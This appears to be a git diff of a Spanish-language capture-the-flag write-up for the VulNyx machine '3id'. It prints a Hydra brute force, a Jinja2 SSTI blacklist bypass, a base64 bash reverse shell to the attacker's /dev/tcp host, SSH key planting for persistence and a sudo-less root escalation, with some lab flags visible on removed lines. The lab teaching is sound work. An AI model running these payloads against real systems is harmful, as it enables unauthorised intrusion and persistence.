@@ -1,4 +1,5 @@
-# Vulnyx — 3id (EidGreetings) · Writeup didáctico
+# Vulnyx — 3id
+> Laboratorio de pentesting en un entorno controlado. Este documento describe únicamente las pruebas realizadas sobre la máquina **3id** de VulNyx.
 
 | Característica | Valor |
 |---|---|
@@ -29,19 +30,19 @@
 
 ## 1. Reconocimiento de red
 
-Antes de atacar una IP hay que **saber qué hay en el segmento**. Primero identifico mi propia configuración de red para saber en qué rango estoy:
+Primero identifico mi propia configuración de red para saber en qué rango estoy:
 
 ```bash
 ip -br addr      # interfaces y sus IPs de un vistazo
 ip route         # gateway por defecto
 ```
 
-![Identificación del segmento de red](images/identificacion_segmento_de_red.png)
+<img width="629" height="78" alt="identificacion segmento de red" src="https://github.com/user-attachments/assets/7299bf48-d25b-4dca-98e5-df30ea4aba2e" />
 
-![Identificación de la puerta de enlace](images/identificacion_puerta_de_enlace.png)
+<img width="626" height="66" alt="identificacion puerta de enlace" src="https://github.com/user-attachments/assets/56ec5329-8f65-4bb7-8ffe-9837fdab035c" />
 
 Salida relevante:
-- `eth0 → 192.168.0.13/24` (mi Kali)
+- `eth0 → 192.168.0.13/24`
 - `default via 192.168.0.1 dev eth0` (gateway)
 
 Entonces el segmento es `192.168.0.0/24`. **Host discovery** con nmap usando ARP (`-PR`), que es lo más fiable y rápido dentro de una LAN:
@@ -53,7 +54,7 @@ sudo nmap -sn -PR 192.168.0.0/24 -oA host-discovery-inicial
 - `-sn` → ping scan, **sin** escanear puertos (solo descubrir hosts vivos).
 - `-PR` → descubrimiento por **ARP**. En una red local, ARP no se puede falsificar fácilmente ni bloquear con un firewall de capa 3, así que detecta hosts que ignoran ICMP.
 
-![Host discovery con nmap -sn -PR](images/Host_discovery_full.png)
+<img width="612" height="633" alt="image" src="https://github.com/user-attachments/assets/7fcc2a65-ab82-43ac-8d94-390b15f0554d" />
 
 **¿Por qué ARP y no ICMP?** Muchos hosts tienen el `ping` (ICMP echo) bloqueado por firewall, pero **todos** los equipos de una misma LAN responden ARP porque es el mecanismo que usa Ethernet para resolver IP→MAC. Si están en tu mismo segmento, ARP los ve.
 
@@ -63,7 +64,7 @@ Para quedarme solo con las IPs vivas, parseo el `.gnmap`:
 awk '/Status: Up/ {print $2}' host-discovery-inicial.gnmap
 ```
 
-![Listado de hosts vivos](images/Host_discovery_list.png)
+<img width="523" height="200" alt="Host discovery list" src="https://github.com/user-attachments/assets/3aeaef0d-3433-4c5b-9c65-f61e610d435a" />
 
 Entre los hosts aparece `192.168.0.18` con MAC `08:00:27:...` → el prefijo OUI `08:00:27` es de **VirtualBox**, señal clara de que esa es la VM objetivo del lab.
 
@@ -84,7 +85,7 @@ sudo nmap -sS -p- 192.168.0.18 -oA port-scanning-full-tcp-192.168.0.18
 - `-sS` → **SYN scan** (half-open). Envía SYN, si recibe SYN/ACK marca abierto y responde RST sin completar el handshake. Más rápido y menos "ruidoso" que un connect completo; necesita privilegios root.
 - `-p-` → los **65535** puertos. Nunca te quedes solo con el top-1000: servicios escondidos en puertos altos son pan de cada día.
 
-![Escaneo completo de puertos TCP](images/descubrimiento_de_puertos_TCP_SYN_full.png)
+<img width="624" height="177" alt="descubrimiento de puertos TCP SYN full" src="https://github.com/user-attachments/assets/47ab1486-3d08-4a4c-98d1-6761208b5224" />
 
 Resultado: **22/tcp** y **80/tcp** abiertos.
 
@@ -96,7 +97,7 @@ sudo nmap -sV -p 22,80 192.168.0.18 -oA service-detection-inicial-192.168.0.18
 
 - `-sV` → **service/version detection**. Interroga cada puerto para sacar producto y versión.
 
-![Detección de servicios 22 y 80](images/descubrimiento_de__servicios_22_80.png)
+<img width="626" height="248" alt="descubrimiento de  servicios 22 80" src="https://github.com/user-attachments/assets/f39a1772-a0c5-4188-abe4-37c724943fd2" />
 
 | Puerto | Servicio | Versión |
 |--------|----------|---------|
@@ -117,11 +118,11 @@ echo "192.168.0.18  3id.nyx" | sudo tee -a /etc/hosts
 
 Navego `http://3id.nyx`: una app llamada **EidGreetings v1.0**, portal interno de la empresa ficticia "KyubiSec Inc.". Páginas visibles: **Home, About Us, Contact Us, Login**.
 
-![Inspección web puerto 80 — Home](images/Inspecci_n_de_web_en_puerto_80_1.png)
+<img width="1197" height="865" alt="Inspección de web en puerto 80 1" src="https://github.com/user-attachments/assets/60164ee1-522b-4bd1-b29b-a013bdc1715e" />
 
-![Inspección web puerto 80 — Login](images/Inspecci_n_de_web_en_puerto_80_2.png)
-
-![Inspección web puerto 80 — Contact](images/Inspecci_n_de_web_en_puerto_80_3.png)
+<img width="1202" height="722" alt="Inspección de web en puerto 80 2" src="https://github.com/user-attachments/assets/3fa3ba8d-d573-48de-bd40-b167a3fd5985" />
+  
+<img width="1155" height="762" alt="Inspección de web en puerto 80 3" src="https://github.com/user-attachments/assets/90ae6d4a-45a5-4fee-b1a2-3fda4b365239" />
 
 La página de **Contact** deja una pista sutil para más adelante:
 
@@ -141,7 +142,7 @@ gobuster dir -u http://3id.nyx/ \
 - `-x php,html,txt` → prueba esas extensiones además del nombre pelado.
 - `-t 30` → 30 hilos.
 
-![gobuster dir en la raíz del puerto 80](images/gobuster_medium_raiz_puerto_80.png)
+<img width="627" height="457" alt="gobuster medium raiz puerto 80" src="https://github.com/user-attachments/assets/8c56b6dc-befe-4230-96a8-f0d408fb957d" />
 
 Rutas encontradas:
 
@@ -162,11 +163,11 @@ Las redirecciones **302 → /login** en `/profile` y `/greetings` confirman que 
 
 En `/login` pruebo credenciales de prueba `test:test`. Falla con *"Invalid username or password. Please try again."*
 
-![Prueba de login con test:test](images/prueba_usuario_test_y_password_test.png)
+<img width="1191" height="721" alt="prueba usuario test y password test" src="https://github.com/user-attachments/assets/9f90ce19-4a7c-48fc-944e-1fb1cfabed0b" />
 
 Capturo la petición en Burp:
 
-![Petición POST del panel de login en Burp](images/request_POST_panel_login.png)
+<img width="642" height="648" alt="request POST panel login" src="https://github.com/user-attachments/assets/81453d98-9fc3-4228-a371-5cc1c5346784" />
 
 ```http
 POST /login HTTP/1.1
@@ -196,7 +197,7 @@ flask-unsign --decode --cookie 'eyJfcGVybWFuZW50Ijp0cnVlfQ.aXNuQ.TCfK2KQiaOVj-Iv
 # → {'_permanent': True}
 ```
 
-![Decodificando la cookie de Flask](images/decodificando_cookie_flask.png)
+<img width="622" height="58" alt="decodificando cookie flask" src="https://github.com/user-attachments/assets/36b6b17e-d983-45ea-8595-f927cb21388f" />
 
 Solo contiene `{'_permanent': True}` porque el login falló; con una sesión válida contendría el usuario, rol, etc.
 
@@ -208,7 +209,7 @@ flask-unsign --unsign \
   --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
 ```
 
-![Crackeo de la cookie — tarda mucho, desisto](images/ccrackeando_cookie_tarda_mucho_desisto.png)
+<img width="627" height="106" alt="ccrackeando cookie tarda mucho desisto" src="https://github.com/user-attachments/assets/c0cdd636-7ba6-4e22-a3ee-a9b98dd18909" />
 
 En esta máquina el proceso es **muy lento** y no sale con rockyou → **lo descarto**. No siempre el primer camino es el bueno; un buen pentester no se obstina, pivota. (Guardamos la técnica para otra ocasión: si el `SECRET_KEY` fuera débil, podríamos firmar una sesión con `username: admin` y entrar sin contraseña.)
 
@@ -230,7 +231,7 @@ gobuster vhost -u http://3id.nyx \
 - `--append-domain` → prueba `FUZZ.3id.nyx` (sin esto probaría solo `FUZZ`, inútil).
 - `-k` → ignora errores TLS.
 
-![Descubrimiento de subdominios con gobuster vhost](images/D_escubrimiento_de_subdominios_con_gobuster.png)
+<img width="626" height="468" alt="D escubrimiento de subdominios con gobuster" src="https://github.com/user-attachments/assets/47c25a04-b95a-41a5-b8a6-baf2d42f5f87" />
 
 ### Teoría: Virtual Hosts
 
@@ -255,13 +256,13 @@ El resto devuelve `400`/mismo tamaño (ruido). Agrego el vhost al hosts:
 
 Visito `http://beta.3id.nyx` → **"EidGreetings v1.1 - Beta Testing Notes"**, una página de notas internas de QA.
 
-![Inspección del subdominio beta](images/inspecciono_subdominio_beta.png)
+<img width="1028" height="595" alt="inspecciono subdominio beta" src="https://github.com/user-attachments/assets/85f32d63-81b7-4733-a260-8694e2658f33" />
 
 Entre los "Known Issues" filtra un **nombre de usuario real**:
 
 > *"User profile page for **alouch** sometimes fails to load avatar from network share. Need to check permissions."*
 
-![Descubrimiento del usuario alouch en el subdominio beta](images/descubrimiento_usuario_alouch_en_subdominio_beta.png)
+<img width="1109" height="519" alt="descubrimiento usuario alouch en subdominio beta" src="https://github.com/user-attachments/assets/a4fc5a66-14ed-46fb-b922-0ea74ebe6977" />
 
 ¡Tenemos usuario! `alouch`. Ahora fuerza bruta de la contraseña contra el login con **Hydra**:
 
@@ -289,7 +290,7 @@ Flags:
 
 > ⚠️ **La condición `F=` (o `S=`) es la clave.** Tenés que loguear a mano con credenciales malas y copiar **el texto de error exacto** que devuelve la app. Si te equivocás en una coma, Hydra reporta todo como válido (falsos positivos) o nada.
 
-![Fuerza bruta al usuario alouch con Hydra](images/fuerza_bruta_a_usuario_alouch.png)
+<img width="630" height="493" alt="fuerza bruta a usuario alouch" src="https://github.com/user-attachments/assets/7d9266d9-f338-49a7-8b6c-09108428ac36" />
 
 Resultado:
 
@@ -309,7 +310,7 @@ Logueado como `alouch`, el dashboard muestra saludos. Al abrir uno:
 http://3id.nyx/greet/share?id=1
 ```
 
-![Ingreso como alouch e identifico un parámetro id](images/Ingreso_como_alouch_e_identifico_un_parametro_id.png)
+<img width="1012" height="660" alt="Ingreso como alouch e identifico un parametro id" src="https://github.com/user-attachments/assets/d7a8e381-0aef-468d-b3dd-9ce57d0d14d9" />
 
 → "Eid Mubarak! ... By: The Management". El parámetro **`id`** selecciona qué saludo se muestra. Primer instinto: **IDOR** (Insecure Direct Object Reference) — cambiar el `id` para ver objetos que no me corresponden.
 
@@ -323,7 +324,7 @@ Pruebo `id=2`:
 http://3id.nyx/greet/share?id=2
 ```
 
-![IDOR: id=2 me permite ver la palabra template](images/Pruebo_idor_que_me_permite_ver_la_palabra_template.png)
+<img width="1150" height="695" alt="Pruebo idor que me permite ver la palabra template" src="https://github.com/user-attachments/assets/0542befc-c3e0-4799-be64-db08d7098f7f" />
 
 → aparece una **"Dev Note: Urgent"** que no era para mis ojos:
 
@@ -346,7 +347,7 @@ Pruebo el parámetro filtrado con la carga de detección clásica:
 http://3id.nyx/greet/share?id=2&template={{9*9}}
 ```
 
-![Prueba de SSTI con el parámetro template — devuelve 81](images/Pruebo_ssti_con_el_par_metro_template.png)
+<img width="913" height="211" alt="Pruebo ssti con el parámetro template" src="https://github.com/user-attachments/assets/8b860f6e-11f2-4f84-8549-5830ee04b481" />
 
 → la página responde **`81`**.
 
@@ -374,7 +375,7 @@ El payload clásico de RCE en Jinja2 es:
 
 Pero al enviarlo salta un **"ACCESS DENIED — Detected Pattern: os"**. Hay un **WAF por lista negra de palabras**.
 
-![Pruebo con cycler pero está bloqueado](images/pruebo_con_cycler_pero_est__bloqueado.png)
+<img width="1163" height="776" alt="pruebo con cycler pero está bloqueado" src="https://github.com/user-attachments/assets/4d0a038d-1993-46bf-8fcc-72e4c5f80be3" />
 
 Y es **incremental**: cada vez que esquivamos una palabra, bloquea la siguiente. El orden que fue apareciendo:
 
@@ -382,9 +383,9 @@ Y es **incremental**: cada vez que esquivamos una palabra, bloquea la siguiente.
 os  →  popen  →  read  →  cycler  →  lipsum  →  request  →  config
 ```
 
-![Bloqueo de otra palabra de la blacklist](images/bloqueo_2.png)
+<img width="1051" height="760" alt="bloqueo 2" src="https://github.com/user-attachments/assets/ce4f1081-debf-4fa6-b736-0aca294d5b78" />
 
-![Reverse shell en base64 bloqueado — intento 1](images/envio_reverse_shell_en_base64_resultado_bloqueado_intento_1.png)
+<img width="623" height="168" alt="envio reverse shell en base64 resultado bloqueado intento 1" src="https://github.com/user-attachments/assets/11bd402f-619b-44d6-80ae-8f7176e43b5b" />
 
 ### Teoría: cómo pensar un bypass de blacklist
 
@@ -446,7 +447,7 @@ echo -n 'bash -i >& /dev/tcp/192.168.0.13/443 0>&1' | base64 -w0
 # YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTMvNDQzIDA+JjE=
 ```
 
-![Genero el reverse shell en base64](images/geenro_reverse_shell_intento_1.png)
+<img width="590" height="40" alt="geenro reverse shell intento 1" src="https://github.com/user-attachments/assets/ec453a8a-72d8-47ca-be0a-a009ce9d6bf9" />
 
 **2. Levanto el listener:**
 
@@ -454,7 +455,7 @@ echo -n 'bash -i >& /dev/tcp/192.168.0.13/443 0>&1' | base64 -w0
 nc -lvnp 443
 ```
 
-![Puerto de escucha 443](images/Puerto_de_escucha_443_intento_1.png)
+<img width="289" height="121" alt="Puerto de escucha 443 intento 1" src="https://github.com/user-attachments/assets/5c2be1a7-dd55-46a7-9f42-e18c8744152f" />
 
 **3. Disparo el payload con curl** (`--data-urlencode` evita todos los problemas de escaping del navegador):
 
@@ -470,7 +471,7 @@ curl -G 'http://3id.nyx/greet/share' \
 - `["sys".__add__("tem")]` → arma `system` sin escribirlo → `os.system(...)`.
 - Con `system` **no hace falta `.read()`** (que estaba bloqueado): el proceso se ejecuta igual y el reverse shell conecta solo.
 
-![Reverse shell intento 3 — payload satisfactorio](images/Reverse_shell_intento_3_satisfactorio.png)
+<img width="625" height="135" alt="Reverse shell intento 3 satisfactorio" src="https://github.com/user-attachments/assets/f80628ca-e80d-4800-bed6-d2d67c504b92" />
 
 Resultado en el listener:
 
@@ -480,7 +481,7 @@ www-data@3id:/home/alouch/eid_app$ whoami
 www-data
 ```
 
-![Reverse shell recibida — intento 3 exitoso](images/Reverse_shell_recibida_intento_3_exitoso.png)
+<img width="625" height="183" alt="Reverse shell recibida intento 3 exitoso" src="https://github.com/user-attachments/assets/c007a289-ad5e-42f7-af52-0edc3cee9aaf" />
 
 **¡Shell como `www-data`!** Y arranca en `/home/alouch/eid_app` (el código de la app corre desde ahí).
 
@@ -503,7 +504,7 @@ Como la shell cae en el home de `alouch`, enumero su carpeta `.ssh`:
 ls -ld / /home /home/alouch /home/alouch/.ssh /home/alouch/.ssh/authorized_keys
 ```
 
-![Enumero los archivos .ssh de alouch](images/enumero_archivos_ssh.png)
+<img width="626" height="169" alt="enumero archivos ssh" src="https://github.com/user-attachments/assets/95249202-842b-460e-b071-da5a6467b130" />
 
 ```
 drwx--x--+ 7 alouch alouch 4096 Jun 12  2025 /home/alouch
@@ -534,7 +535,7 @@ cat alouch_key.pub
 # ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... kali@kali
 ```
 
-![Genero la clave SSH en mi Kali](images/genero_clave_ssh_en_mi_kali.png)
+<img width="628" height="348" alt="genero clave ssh en mi kali" src="https://github.com/user-attachments/assets/5e241777-e376-44d5-a89e-cfc634ea237f" />
 
 - `-t ed25519` → tipo de clave (moderna y corta).
 - `-f alouch_key` → archivo de salida.
@@ -546,7 +547,7 @@ cat alouch_key.pub
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... kali@kali' > /home/alouch/.ssh/authorized_keys
 ```
 
-![Agrego la clave SSH en la VM víctima](images/agrego__clave_ssh_en_la_vm_victoima.png)
+<img width="636" height="94" alt="agrego  clave ssh en la vm victoima" src="https://github.com/user-attachments/assets/d67e7245-6e2c-477b-b753-e7e05b0aff83" />
 
 (El archivo pesaba 1 byte, prácticamente vacío, así que sobrescribir con `>` no rompe nada.)
 
@@ -556,7 +557,7 @@ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... kali@kali' > /home/alouch/.ssh/aut
 ssh -i alouch_key alouch@3id.nyx
 ```
 
-![Ingreso como alouch por SSH con las claves agregadas](images/ingreso_como_alouch_por_ssh_con_las_claves_agregadas.png)
+<img width="622" height="555" alt="ingreso como alouch por ssh con las claves agregadas" src="https://github.com/user-attachments/assets/3e4b13fb-6a5e-4224-a4d0-c06208b5d763" />
 
 ```
 WELCOME TO 3ID MACHINE VIA SSH
@@ -567,10 +568,10 @@ alouch@3id:~$
 
 ```bash
 cat /home/alouch/user.txt
-# 1e85d5f5c85452d9fab192313bd0f0c6
+# 1e85d5f5c85452xxxxxxxxxxxxxx
 ```
 
-![Obtengo user.txt](images/obtengo_usertxt.png)
+<img width="387" height="108" alt="image" src="https://github.com/user-attachments/assets/1e73e472-87d0-4d95-80de-135e7b6ca8c2" />
 
 > 🧠 **¿Por qué una clave SSH y no sacar la contraseña?** Aunque ya teníamos `alouch:123`, escribir la clave en `authorized_keys` nos da una **shell completa e interactiva** por SSH (TTY real, persistente), muchísimo más cómoda que la reverse shell de la app. Además demuestra el impacto del fallo de ACL.
 
@@ -584,7 +585,7 @@ Primer reflejo tras conseguir un usuario: revisar qué puede ejecutar con `sudo`
 sudo -l
 ```
 
-![Identifico maintenance_cleanup.sh como root en el sudo de alouch](images/identifico_mainteance_cleanupsh_como_root_en_el_sudo_de_alouch.png)
+<img width="622" height="162" alt="identifico mainteance_cleanupsh como root en el sudo de alouch" src="https://github.com/user-attachments/assets/2c93115e-1b4e-46a9-bb50-d2aec474b3e2" />
 
 ```
 User alouch may run the following commands on 3id:
@@ -636,16 +637,16 @@ Ya dentro de `less`, escribo:
 
 y Enter. `less` ejecuta `/bin/bash` → **shell como root**.
 
-![Escalada a root](images/escalada_a_root.png)
+<img width="597" height="280" alt="escalada a root" src="https://github.com/user-attachments/assets/692af945-154c-4b0b-92f4-bca3df9c9637" />
 
 ```bash
 id
 # uid=0(root) gid=0(root) groups=0(root)
 cat /root/root.txt
-# 6d15b6b430f520414880172533f184f8
+# 6d15b6b430f52xxxxxxxxxxxxxxx
 ```
 
-![Obtengo la flag root](images/obtengo_flag_root.png)
+<img width="304" height="136" alt="image" src="https://github.com/user-attachments/assets/23d20227-c13e-4606-bf27-2981aa814862" />
 
 **¡ROOT! 🏆**
 
@@ -675,8 +676,8 @@ Recon LAN (ARP) ─► nmap (22,80) ─► web EidGreetings
 
 | Flag | Valor |
 |------|-------|
-| `user.txt` | `1e85d5f5c85452d9fab192313bd0f0c6` |
-| `root.txt` | `6d15b6b430f520414880172533f184f8` |
+| `user.txt` | `1e85d5f5c85452d9fab1xxxxxxxxxxx` |
+| `root.txt` | `6d15b6b430f52041488xxxxxxxxxx` |
 
 ### Vulnerabilidades y cómo se arreglan
 
@@ -693,7 +694,3 @@ Recon LAN (ARP) ─► nmap (22,80) ─► web EidGreetings
 ### Herramientas usadas
 
 `nmap`, `gobuster` (dir + vhost), `flask-unsign`, `hydra`, `burpsuite`, `curl`, `ssh-keygen`, `getfacl`, `nc`, y conocimiento de **GTFOBins**.
-
----
-
-> **Nota ética:** este writeup documenta la explotación de una máquina de laboratorio (Vulnyx), diseñada legalmente para practicar. No apliques estas técnicas sobre sistemas sin autorización explícita.
